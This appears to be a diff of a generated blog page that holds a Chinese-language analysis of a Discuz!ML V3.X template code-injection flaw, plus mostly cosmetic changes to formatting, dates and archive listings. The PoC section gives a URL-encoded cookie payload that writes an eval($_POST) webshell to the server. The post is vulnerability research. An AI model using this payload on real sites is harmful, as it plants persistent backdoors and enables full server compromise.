@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">779</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">776</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -426,15 +426,15 @@ height:50vh;
 <p>其他地方都是包含，这里有个缓存文件，先不管，继续跟，发现开始加载 forum_index.php</p>
 <p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8i1nm7dj20ib01y3yg.jpg" alt></p>
 <p>form_index.php 的 433 行开始加载模板</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> template(<span class="string">'diy:forum/discuz:'</span>.$gid);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> template(<span class="string">'diy:forum/discuz:'</span>.$gid);</span><br></pre></td></tr></table></figure>
 
 <p>之前的那个可控点在这里出现了</p>
 <p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8lkglfpj213c00wt8t.jpg" alt></p>
 <p>紧接着被传入了这个函数之中</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checktplrefresh($tplfile, $tplfile, @filemtime(DISCUZ_ROOT . $cachefile), $templateid, $cachefile, $tpldir, $file);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">checktplrefresh($tplfile, $tplfile, @filemtime(DISCUZ_ROOT . $cachefile), $templateid, $cachefile, $tpldir, $file);</span><br></pre></td></tr></table></figure>
 
 <p>继续跟，在 function_core.php 中的第 523 行 <code>cachefile</code> 被传入进行解析</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$template-&gt;parse_template($maintpl, $templateid, $tpldir, $file, $cachefile);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$template-&gt;parse_template($maintpl, $templateid, $tpldir, $file, $cachefile);</span><br></pre></td></tr></table></figure>
 
 <p>在 class_template.php 中，读取了一下原有的模板</p>
 <p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dm9l9v9uj20ti02ijrz.jpg" alt></p>
@@ -448,18 +448,18 @@ height:50vh;
 <p><code>template()</code>将返回一个绝对路径，然后被包含，这时候会执行之前生成的模板，这里继续加载模板。</p>
 <p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmgzw8lxj21ar0i20wh.jpg" alt></p>
 <p>直到这一次加载，恶意语句才真正写入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$headeradd = <span class="string">"</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_common.htm', 1564153001, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_qmenu.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/pubsearchform.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">;"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$headeradd = <span class="string">"</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_common.htm', 1564153001, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_qmenu.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/pubsearchform.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">;"</span></span><br></pre></td></tr></table></figure>
 
 <p>可看到具体的位置</p>
 <p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmpsp4yej21fc04m3zq.jpg" alt></p>
 <p>简化一下就是</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checktplrefresh(<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="number">1564153002</span>, <span class="string">''</span>, <span class="string">'3'</span>.phpinfo().<span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">checktplrefresh(<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="number">1564153002</span>, <span class="string">''</span>, <span class="string">'3'</span>.phpinfo().<span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>)</span><br></pre></td></tr></table></figure>
 
 <p>自然 <code>phpinfo()</code> 的内容就被拼接到了模板文件中</p>
 <p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dnd8cpnrj20am03mmx3.jpg" alt></p>
 <p>最初生成的文件中还有加载了其他模板，接二连三就生成了好几个文件，最终形成了展示的页面。</p>
 <h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>由于 cookie 中不能有大写字母，写 webshell 时自然不能直接写，这里可以使用 URL 编码来解决。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">27.</span>file_put_contents%<span class="number">28</span>%<span class="number">27</span>confi9.php%<span class="number">27</span>%<span class="number">2</span>Curldecode%<span class="number">28</span>%<span class="number">27</span>%<span class="number">253</span>c%<span class="number">253</span>fphp+%<span class="number">2520</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">2524</span>_%<span class="number">2550</span>%<span class="number">254</span>f%<span class="number">2553</span>%<span class="number">2554</span>%<span class="number">255</span>b1%<span class="number">255</span>d%<span class="number">29</span>%<span class="number">253</span>b%<span class="number">253</span>f%<span class="number">253</span>e%<span class="number">27</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">27</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">27.</span>file_put_contents%<span class="number">28</span>%<span class="number">27</span>confi9.php%<span class="number">27</span>%<span class="number">2</span>Curldecode%<span class="number">28</span>%<span class="number">27</span>%<span class="number">253</span>c%<span class="number">253</span>fphp+%<span class="number">2520</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">2524</span>_%<span class="number">2550</span>%<span class="number">254</span>f%<span class="number">2553</span>%<span class="number">2554</span>%<span class="number">255</span>b1%<span class="number">255</span>d%<span class="number">29</span>%<span class="number">253</span>b%<span class="number">253</span>f%<span class="number">253</span>e%<span class="number">27</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">27</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最初的可控变量被拼接到模板中，再加上生成的模板被包含，此时恶意代码就生效了，导致代码注入。</p>
 
@@ -470,7 +470,7 @@ height:50vh;
             <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
             </p><p>原文链接：<a href="https://wywwzjj.top/2019/07/18/Discuz-ML!-V3.X-RCE/">https://wywwzjj.top/2019/07/18/Discuz-ML!-V3.X-RCE/</a>
             </p><p>发表日期：<a href="https://wywwzjj.top/2019/07/18/Discuz-ML!-V3.X-RCE/">July 18th 2019, 11:34:37 pm</a>
-            </p><p>更新日期：<a href="https://wywwzjj.top/2019/07/18/Discuz-ML!-V3.X-RCE/">January 21st 2020, 11:06:29 pm</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2019/07/18/Discuz-ML!-V3.X-RCE/">March 22nd 2020, 6:11:48 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -487,8 +487,8 @@ height:50vh;
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/07/11/PHP-写入配置文件经典问题/" title="PHP 写入配置文件经典问题">
-                    <div class="prevTitle">PHP 写入配置文件经典问题</div>
+                <a href="/2019/07/11/PHP-写入配置文件经典问题/" title="PHP 写配置文件经典问题">
+                    <div class="prevTitle">PHP 写配置文件经典问题</div>
                 </a>
             
         </li>
@@ -1414,9 +1414,93 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 54
+        Total : 58
         </div>
         <!-- search  -->
         
@@ -1429,6 +1513,21 @@ top:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href="/2020/03/22/LeetCode-Weekly-Contest-181/">LeetCode Weekly Contest 181</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href="/2020/03/22/LeetCode-Weekly-Contest-22/">LeetCode Weekly Contest 22（双周赛）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/2020/03/21/LeetCode-数据库专题/">LeetCode 数据库专题</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1551,7 +1650,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/11</span><a class="archive-post-title" href="/2019/07/11/PHP-写入配置文件经典问题/">PHP 写入配置文件经典问题</a>
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href="/2019/07/11/PHP-写入配置文件经典问题/">PHP 写配置文件经典问题</a>
         </li>
     
     
@@ -1621,17 +1720,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
         </li>
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ 2352 Stars[树状数组]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ 2352 Stars[树状数组]</a>
         </li>
     
     
@@ -1723,15 +1827,15 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
     
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
-        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+        <span class="sidebar-tag-name" data-tags="读书笔记"><span class="iconfont-archer">&#xe606;</span>读书笔记</span>
     
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
-        <span class="sidebar-tag-name" data-tags="读书笔记"><span class="iconfont-archer">&#xe606;</span>读书笔记</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
     
@@ -1749,8 +1853,6 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="smarty"><span class="iconfont-archer">&#xe606;</span>smarty</span>
     
-        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
-    
         <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
@@ -1763,9 +1865,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
